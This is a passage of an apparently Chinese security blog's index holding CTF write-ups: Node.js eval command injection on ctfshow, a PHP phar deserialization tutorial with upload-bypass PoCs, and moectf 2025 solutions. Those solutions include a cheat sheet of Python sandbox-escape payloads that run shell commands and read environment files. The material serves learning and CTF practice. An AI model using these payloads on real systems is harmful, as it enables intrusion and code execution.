1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\n利用require(&#39;child_process&#39;).spawnSync(&#39;nl&#39;,[&#39;a&#39;]).stdout.toString();读文件\ncalc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;a&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\n\nNSSCTF&#123;d7a0ce62-0588-468d-962b-82dc93a05c02&#125;\n\nctfshow-335控制台发现提示?eval,直接读环境变量\n?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;/proc/self/environ&#x27;]).stdout.toString();\n\n\nctfshow&#123;4b42b419-0ed2-4aa5-8be3-9c65286d76e1&#125;\n\nctfshow-337var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n\n利用数组绕过：\n?a[]=1&amp;b[]=1\n\n\nctfshow&#123;659a8987-8805-4f75-886b-ce2cad9136aa&#125;\n\n","categories":["node.js"],"tags":["node.js 命令执行"]},{"title":"phar反序列化","url":"/2025/09/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Phar是什么?正如同java里的jar包一样,一个应用,打包进所有的可执行,可访问的文件,让部署的过程变得十分简单。在php中,用来干这事的就是phar文件。\nphar是类似jar的一种打包文件，通过将php代码文件和其他资源（图像，css等）打包到一个文件中，本质上是一个压缩文件\nPhar文件的结构通过访问官网，得知phar文件的结构：\n\n\nStub —&gt; Phar 的文件头\nmanifest —&gt; 压缩文件信息\ncontents —&gt; 压缩文件内容\nsignature —&gt; 签名\n\n来分析一下这四个部分：\nStubstub可以理解为是Phar文件的一个文件标识，stub是一个简单的php文件，他有一定的格式要求\nxxx&lt;?php xxx; __HALT_COMPILER();?&gt;\n\nxxx里的内容可以自定义，但是__HALT_COMPILER();是必须的，没有这一句的话，php是认不出来这个phar文件的\n也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。\nmanifestmanifest里存放的是文件的属性，权限等详细信息，这里面包含的meta-data是我们主要的攻击地方。这里的 Meta-data 是我们用户自定义的（详细见下图）\n\ncontents被压缩文件的内容\nsignature签名，放在文件末尾，格式如下：\n\n参数是可选的（修改签名函数），这里我们只需要知道我们最好是使用脚本创建 Phar 文件，创建好之后就不能轻易修改 Phar 文件中的内容了，否则签名与内容对不上。\n创建phar文件一个简单的创建phar文件的脚本\n&lt;?php class test&#123;    public $name=&quot;qwq&quot;;    function __destruct()    &#123;        echo $this-&gt;name;    &#125;&#125;$a = new test();$a-&gt;name=&quot;phpinfo();&quot;;$phartest=new phar(&#x27;test.phar&#x27;,0); //创建时后缀名必须为phar,上传文件的时候可以修改后缀来bypass$phartest-&gt;startBuffering(); //设置缓冲区，准备 Phar 的写操作$phartest-&gt;setMetadata($a);//将自定义的 Meta-data 存入manifest，实现我们想要的操作$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub//stub是一个简单的php文件。PHP通过 stub 识别一个文件为PHAR文件，可以利用这点绕过文件上传检测$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件以及文件的内容$phartest-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘?&gt;\n\n来看看得到的phar文件\n\n可以清晰的看到我们自定义的序列化字符串，那么什么时候这个字符串会被反序列化呢？\nPhar 反序列化以及可利用函数php的大部分文件函数在通过phar:&#x2F;&#x2F;伪协议读取phar文件的时候，都会将mata-data字段反序列化操作，受影响的函数如下：\n\n\n\n能够利用的函数\n\n\n\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\n\n\nfile_put_contents\nfile\nfilegroup\nfopen\n\n\nfileinode\nfilemtime\nfileowner\nfileperms\n\n\nis_dir\nis_executable\nis_file\nis_link\n\n\nis_readable\nis_writable\nis_writeable\nparse_ini_file\n\n\ncopy\nunlink\nstat\nreadfile\n\n\n常见的就是file_exists函数了\n为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？这里需要通过php底层代码才能知道，关于这个问题ZSX师傅的Phar与Stream Wrapper造成PHP RCE的深入挖掘已经详细分析了。\n当这些函数接收到phar://伪协议处理到 phar 文件的时候，Meta-data 里的序列化字符串就会被反序列化，实现不使用unserialize() 函数实现反序列化的操作\n当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了反序列化攻击面。\n利用条件\nphar文件要能够上传到服务器端。\n如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。\n文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。\n\n反序列化攻击拓展upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif\n&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) &amp;&amp; (substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;) + 1) == &#x27;gif&#x27;)) &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;    &#125; else &#123;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    &#125;&#125; else &#123;    echo &quot;Invalid file, you can only upload gif&quot;;&#125;\n\nupload_file.html:\n&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nun.php:\n&lt;?php$filename=@$_GET[&#x27;filename&#x27;];echo &#x27;please input a filename&#x27;.&#x27;&lt;br /&gt;&#x27;;class AnyClass&#123;    var $output = &#x27;echo &quot;ok&quot;;&#x27;;    function __destruct()    &#123;           eval($this -&gt; output);    &#125;&#125;    if(file_exists($filename))&#123;        $a = new AnyClass();    &#125;    else&#123;        echo &#x27;file is not exists&#x27;;    &#125;?&gt;\n\n该demo环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法__destruct()以及文件操作函数file_exists()，而且在AnyClass类中调用了eval，以此用来命令执行。\n根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif。将phar文件后缀改为gif上传上去。然后利用file_exists，使用phar:&#x2F;&#x2F;执行代码\npoc:\n&lt;?phpclass AnyClass&#123;    var $output = &#x27;&#x27;;&#125;$phar = new Phar(&#x27;phar.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$object = new AnyClass();$object -&gt; output= &#x27;phpinfo();&#x27;;$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering();\n\n运行生成出phar.phar后，改后缀名为gif\npayload:un.php?filename=phar://phar.gif/test\n例题[HNCTF 2022 WEEK3]ez_pharhttps://www.nssctf.cn/problem/3018\n&lt;?phpshow_source(__FILE__);class Flag&#123;    public $code;    public function __destruct()&#123;    // TODO: Implement __destruct() method.        eval($this-&gt;code);    &#125;&#125;$filename = $_GET[&#x27;filename&#x27;];file_exists($filename);?&gt;\n\n最简单的phar反序列化+pop链,pop链部分直接给出exp:\n&lt;?phpclass Flag&#123;    public $code=&quot;system(&#x27;cat /f*&#x27;)&quot;;    public function __destruct()&#123;        eval($this-&gt;code);    &#125;&#125;    ?&gt;\n\n题目提示upload something,访问upload.php,果然能上传文件\n\n接着来制作phar文件\n&lt;?phpclass Flag&#123;    public $code=&quot;system(&#x27;cat /f*&#x27;);&quot;;    public function __destruct()&#123;        // TODO: Implement __destruct() method.        eval($this-&gt;code);    &#125;&#125;$a = new Flag();$phar = new Phar(&#x27;exp.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;1&#x27;);$phar-&gt;stopBuffering();\n\n生成exp.phar,然后提交\n\n只能上传jpg,png,jpeg。后缀改成png再上传\n\n然后通过phar伪协议触发反序列化,?filename=phar://upload/exp.png得到flag\n\nNSSCTF&#123;e44cafda-285c-49a1-ac7e-181fabed6c90&#125;\n\n导致phar触发的其他地方(sql)Postgres&lt;?php$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;test&quot;, &quot;root&quot;, &quot;root&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#x27;aa&#x27;, &#x27;phar://test.phar/aa&#x27;);\n\n当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。\nMysqlLOAD DATA LOCAL INFILE也会触发phar造成反序列化。\n&lt;?phpclass TestObject &#123;    function __destruct()    &#123;        echo $this-&gt;data;        echo &#x27;Destruct called&#x27;;    &#125;    &#125;    // $filename = &#x27;compress.zlib://phar://phar.phar/test.txt&#x27;;    // file_get_contents($filename);     $m = mysqli_init();    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);    $s = mysqli_real_connect($m, &#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;test&#x27;, 3306);    $p = mysqli_query($m, &#x27;LOAD DATA LOCAL INFILE \\&#x27;phar://phar.phar/test.txt\\&#x27; INTO TABLE users  LINES TERMINATED BY \\&#x27;\\r\\n\\&#x27;  IGNORE 1 LINES;&#x27;); ?&gt;\n\n\n可以看到mysql读取phar文件的时候成功触发了反序列化\n例题SUCTF2019-Upload labs 2","categories":["php phar 反序列化"],"tags":["phar 反序列化 php"]},{"title":"moectf 2025wp(全)","url":"/2025/09/09/moectf-wp/","content":"moectfmiscMisc入门指北下载附件直接搜moe,把那一串复制即可\n\nmoectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;\n\nez_LSBzsteg一把梭\n\nThe flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;\n\nsstv找一个能解码sstv的即可\n\nmoectf&#123;d3codiNG_SStV_reQu1REs-PATI3nC3&#125;\n\n捂住一只耳用audacity打开\n\n.._. ._.. ._ __.  .. ... ___... .... ._  ._.. .._. ..__._  ._. ._ _.. .. ___ ..__._ ..  _. ..__._ _.._  _..  .._\n\n..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. .- ..--.- -..- -.. ..-\n\n解码得到\nFLAGIS:HALF_RADIO_IN_XDUmoectf&#123;HALF_RADIO_IN_XDU&#125;\n\nEnchantmentwireshark打开,先用http.request.method &#x3D;&#x3D; “POST”查看上传文件,选中Portable Network Graphics导出分组字节流\n\n银河字母解密即可\n\ntheflagisbelow nowyouhave mastered enchantingmoectf&#123;now_you_have_mastered_enchanting&#125;\n\nez_png用binwalk过一遍,就出来了\n\nmoectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;\n\nez_锟斤拷????gbk转utf8即可\nmoectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;\n\nez_ssl导出http对象,发现上传了ssl.log\n------WebKitFormBoundary1EV4LSnnRBL8OzyBContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ssl.log&quot;Content-Type: application/octet-streamCLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4------WebKitFormBoundary1EV4LSnnRBL8OzyB--\n\n有了这个ssl.log,我们就可以解密https流量\n\n打开 Wireshark → Edit → Preferences → Protocols → TLS\n\n在 (Pre)-Master-Secret log filename 填入 ssl.log 文件路径\n\nWireshark 就能自动用里面的密钥解密 TLS 流量，显示 HTTP&#x2F;HTTPS 明文\n\n\n浏览流量包,发现存在上传流量\n\n\n可见上传了flag.zip,密码为纯7位数字,导出解压\nzip2john 1.zip &gt; hash.txtjohn --format=zip --mask=?d?d?d?d?d?d?d hash.txt\n\n\n6921682\nook解密即可\n\nmoectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;\n\nencrypted_pdf下载得到加密的pdf,放在ilovepdf里解密\n矢量化pdf,https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870\n\nmoectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;\n\n万里挑一一万个压缩包里找到一个正确的密码,解压lock.zip\nimport pyzipperimport zipfileimport osimport re# 路径配置lock_zip = r&quot;D:\\Problems\\moe\\1\\lock.zip&quot;password_zip = r&quot;D:\\Problems\\moe\\1\\password.zip&quot;extract_root = r&quot;D:\\Problems\\moe\\1\\extracted&quot;lock_extract_dir = r&quot;D:\\Problems\\moe\\1\\unlocked&quot;# 正则匹配 &quot;The password is:&quot; 后面的内容password_pattern = r&#x27;The password is:\\s*(\\S+)&#x27;# 尝试用密码解锁 lock.zip 中的 flag.zip（支持 AES 加密）def try_unlock_flag_zip(password):    try:        with pyzipper.AESZipFile(lock_zip) as zf:            for name in zf.namelist():                if name.lower().endswith(&#x27;flag.zip&#x27;):                    print(f&quot;尝试解锁 &#123;name&#125;，使用密码 &#123;password&#125;&quot;)                    zf.extract(name, path=lock_extract_dir, pwd=password.encode())                    print(f&quot;成功解压 &#123;name&#125;！密码: &#123;password&#125;&quot;)                    return True    except Exception as e:        print(f&quot;密码 &#123;password&#125; 解锁失败: &#123;e&#125;&quot;)    return False# 递归提取 password.zip 中 pwd.txt 并尝试解锁 flag.zipdef recursive_extract_password(zip_path, extract_to):    try:        with zipfile.ZipFile(zip_path) as zf:            for name in zf.namelist():                file_path = os.path.join(extract_to, name)                # 如果是 pwd.txt                if name.lower().endswith(&#x27;pwd.txt&#x27;):                    os.makedirs(os.path.dirname(file_path), exist_ok=True)                    zf.extract(name, extract_to)                    with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:                        content = f.read()                        match = re.search(password_pattern, content)                        if match:                            password = match.group(1)                            print(f&quot;找到密码: &#123;password&#125;&quot;)                            if try_unlock_flag_zip(password):                                return True                # 如果是 zip 文件，递归处理                elif name.lower().endswith(&#x27;.zip&#x27;):                    os.makedirs(os.path.dirname(file_path), exist_ok=True)                    zf.extract(name, extract_to)                    if recursive_extract_password(file_path, os.path.join(extract_to, os.path.splitext(name)[0])):                        return True    except Exception as e:        print(f&quot;处理 &#123;zip_path&#125; 出错: &#123;e&#125;&quot;)    return False# 创建必要目录os.makedirs(extract_root, exist_ok=True)os.makedirs(lock_extract_dir, exist_ok=True)# 开始递归提取密码并尝试解锁 flag.zipsuccess = recursive_extract_password(password_zip, extract_root)if not success:    print(&quot;未找到有效密码，flag.zip 未解锁。&quot;)\n\n\n密码为a296a5ec1385f394e8cb\n\n已知明文.exe和flag.txt加密类型为都为ZipCrypto Store,尝试明文攻击,先攻击明文.exe\n首先准备明文文件\necho -n &quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot; | xxd -r -ps &gt; mingwen\n\n进行攻击\nbkcrack -C flag.zip -c 明文.exe -p mingwen -o 102 &gt; 1.log\n\n\n得到keys\nKeys: eec878a3 6808e48f 3aa41bd8\n\n攻击flag.txt\nbkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d decrypted_flag.txt\n\n\nmoectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;\n\nrush补全定位符即可\n\n\nmoectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;\n\nweird_photo改宽即可\n\nmoectf&#123;images/image_Height_Restored&#125;\n\nWebRepo扫码,得到提示\n\n用binwalk检测出\n└─# binwalk --run-as=root 1.zip                                              DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------16012         0x3E8C          7-zip archive data, version 0.3\n\n用以下命令提取\ndd if=1.zip of=repo.7z bs=1 skip=16012\n\n\n发现有flag.txt,且这个文件夹其实就是.git文件,直接从提交里导出flag.txt\ngit log --pretty=oneline -- flag.txt //249ff41401736165cd4514cee7afcd31ecfe7d09git show &lt;提交哈希&gt;:flag.txt &gt; flag.txt\n\n\nmoectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;\n\nEncrypted volume从题目和提示猜测和veracrypt有关.将附件用binwalk分离出一张二维码\n\n:@(s&lt;&quot;A3F:89x541Ux[&lt;\n\n然后有一个volume文件,我们用上面的工具挂载下来\n\n得到brainfuck.txt，解密即可\n\nmoectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;\n\npyjail0nc 192.168.243.1 54227\n\n然后按照要求即可,flag在&#x2F;proc&#x2F;self&#x2F;environ\n\nmoectf&#123;a8b61373-b10d-c71a-b109-041b45320746&#125;\n\nPyjail 1def chall():    user_input = input(&quot;Give me your code: &quot;)    # 过滤关键字    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]    for keyword in forbidden_keywords:        if keyword in user_input:            print(f&quot;Forbidden keyword detected: &#123;keyword&#125;&quot;)            return        result = eval(user_input)\n\n需要进行沙箱逃逸参考文档:https://www.cnblogs.com/N1ng/p/18491520\n尝试用help()无法绕过\n黑名单可以用unicode编码绕过,网上找的脚本如下\nfrom unicodedata import normalizefrom string import ascii_lowercasefrom collections import defaultdictlst = list(ascii_lowercase)dic = defaultdict(list)for char in lst:    for i in range(0x110000):        if normalize(&quot;NFKC&quot;, chr(i)) == char:            dic[char].append(chr(i))        if len(dic[char]) &gt; 9:            breakprint(dic)\n\n得到\n𝓮val(inp𝓾t())\n\n输入之后进入交互状态,之后即可逃逸\n__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)\n\n\n\n\nmoectf&#123;1abe3a6d-4e4e-2cf4-7b0a-4ccfd7cb8a6b&#125;\n\n𝓮val(inp𝓾t())__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)\n\n\n\nPyjail 2def chall():    user_input = input(&quot;Give me your code: &quot;)    # 过滤关键字    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]    for keyword in forbidden_keywords:        if keyword in user_input:            print(f&quot;Forbidden keyword detected: &#123;keyword&#125;&quot;)            return        # 过滤特殊字符    forbidden_chars = [&#x27;.&#x27;, &#x27;_&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]    for char in forbidden_chars:        if char in user_input:            print(f&quot;Forbidden character detected: &#123;char&#125;&quot;)            return    result = eval(user_input)\n\n本地测试发现上一题的payload可以继续打\n\nmoectf&#123;74642fb3-4cea-91a2-ffb3-50f2c35302b6&#125;\n\npyjail 3def chall():    user_input = input(&quot;Give me your code: &quot;)            try:        result = eval(user_input, &#123;&quot;__builtins__&quot;: None&#125;, &#123;&#125;)        # Hint: When __builtins__ is None, you need to be more creative...        print(&quot;Code executed successfully!&quot;)        if result is not None:            print(f&quot;Return value: &#123;result&#125;&quot;)    except Exception as e:        print(f&quot;Execution error: &#123;type(e).__name__&#125;: &#123;e&#125;&quot;)        \n\n这里直接清空了所有builtins里的函数\n# os[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;cat /tmp/f*&quot;)# subprocess [ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)# builtins[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]# help[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;][ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]#sys[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#commands (not very common)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)#pty (not very common)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)#importlib[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)#imp[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)#pdb[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)# ctypes[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())# multiprocessing[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()\n\n这是我从https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8F找到的一些通过继承链的方式进行逃逸的payload,以第一条为例解释\n分步拆解:\n\n&#39;&#39;.__class__\n空字符串 &#39;&#39; 的类就是 str。\n所以 &#39;&#39;.__class__ == str。\n\n\n.__base__\nstr 继承自 object。\n所以 &#39;&#39;.__class__.__base__ == object。\n\n\n.__subclasses__()\nobject.__subclasses__() 会返回当前所有 object 的子类，也就是 Python 运行环境中加载的所有类对象。\n这包含了很多标准库的类，比如 type, tuple, list, _wrap_close 等。\n\n\nif x.__name__==&quot;_wrap_close&quot;\n遍历 object.__subclasses__() 返回的所有类，筛选出名字叫 &quot;_wrap_close&quot; 的类。\n_wrap_close 是 Python 在处理 I&#x2F;O 时用的一个内部类。\n\n\nx.__init__.__globals__\n取 _wrap_close 类的 __init__ 方法。\n每个函数对象都有一个 __globals__ 属性，指向定义它时所在的全局变量字典（也就是一整个 Python 全局命名空间）。\n在这个字典里，可以找到内置函数、模块等，包括 system。\n\n\n[ ... ][0]\n前面用列表推导式找到了目标类，把它们的 __globals__ 收集到列表中。\n取第一个 [0]。\n\n\n[&quot;system&quot;]\n从全局字典里拿到键 &quot;system&quot; 对应的值，也就是 os.system。\n\n\n(&quot;cat /tmp/f\\*&quot;)\n调用 os.system(&quot;cat /tmp/f*&quot;)，执行系统命令，把 /tmp 目录下以 f 